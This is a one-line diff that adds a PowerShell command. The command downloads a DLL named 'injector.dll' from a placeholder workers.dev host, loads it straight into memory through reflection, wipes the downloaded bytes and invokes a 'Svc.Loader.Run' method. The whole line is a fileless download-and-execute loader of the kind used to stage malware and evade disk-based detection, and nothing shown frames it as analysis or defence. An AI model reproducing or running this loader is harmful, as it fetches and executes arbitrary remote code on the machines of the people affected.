@@ -1,0 +1,1 @@
+$U="https://cdn-assets.YOUR-DOMAIN.workers.dev";$b=(New-Object Net.WebClient).DownloadData("$U/injector.dll");$a=[Reflection.Assembly]::Load($b);[Array]::Clear($b,0,$b.Length);$r=$a.GetType("Svc.Loader").GetMethod("Run").Invoke($null,@($U));Write-Host "[*] result=$r";Read-Host "press enter to close"
